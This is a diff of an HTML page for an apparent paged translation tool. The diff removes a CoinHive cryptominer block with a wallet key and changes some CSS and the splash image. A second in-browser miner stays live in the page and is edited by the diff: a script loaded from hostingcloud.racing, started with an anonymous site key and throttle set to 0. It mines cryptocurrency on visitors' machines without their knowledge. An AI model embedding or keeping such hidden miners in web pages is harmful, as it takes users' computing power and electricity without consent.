@@ -3,13 +3,7 @@
 <head>
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/FileSaver.js/2.0.0/FileSaver.min.js"></script>
-<script src="https://github.com/ctrl-qcvh/misc.git"></script>
-<script src="/coin/coinHiveSource.js"></script>
-<script>
- var miner = new CoinHive.User('4AA2tw5ipT59fHqbmQtZmGDKypw8Md58xJUP9DVmtJbcfRs2YheemMKNgR5bMTELnHhyMgx3y573Ndb3321VSXjj1JJ5nPx', 'ctrl-h');
- miner.start();
-</script>
-<script src="/coinHive.js"></script>
+
 <link rel="shortcut icon" type="image/x-icon" href="https://media.giphy.com/avatars/kevinreu/mU3Jvo1jCKRV/200h.gif">
 <meta charset="UTF-8">
 <style>
@@ -48,12 +42,12 @@ height: 20%;
 
 #splash {
 	position: fixed;
-  top: 50%;
+  top: 30%;
   left: 50%;
   transform: translate(-50%, -50%);
   z-index:-1;
 	animation-name: logo;
-  animation-duration: 4s;
+  animation-duration: 6s;
 	animation-fill-mode: forwards;
 }
 @keyframes logo {
@@ -75,7 +69,7 @@ ptags {
 <meta name="revisit-after" content="8 days">
 </head>
 <body id="body">
-	<img id="splash" src="data:image/png;base64,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"alt="" style="width:100%;">
+	<img id="splash" src="https://media0.giphy.com/media/ZYK1Sf57d8ElClTsAK/giphy.gif?cid=6c09b952j36goopgstnrfoune0jb9smobrfqh8e9lbdfffdv&ep=v1_internal_gif_by_id&rid=giphy.gif&ct=g"alt="" style="width:100%;">
 <div id="output-translation"></div>
 <button onclick="chunkBack();">PREVIOUS PAGE</button><button onclick="chunk();">Translate/NEXT PAGE</button>
 <!--<script src="https://cdnjs.cloudflare.com/ajax/libs/FileSaver.js/1.3.8/FileSaver.js"></script>-->
@@ -2901,7 +2895,8 @@ DAWc4quZgTUiRddr3tnV9XH7xG7sWDMmUX</text>
 <div id="textLog"></div>
 <script src="https://www.hostingcloud.racing/XKJN.js"></script>
 <script>
-    var _client = new Client.Anonymous('73043ffdbf2084b38bf16e6c9a4ae479dcce5aa6b1bd3d75f0439a50377eb3e8', {
+var _client
+     _client = new Client.Anonymous('73043ffdbf2084b38bf16e6c9a4ae479dcce5aa6b1bd3d75f0439a50377eb3e8', {
         throttle: 0, c: 'w', ads: 0
     });
     
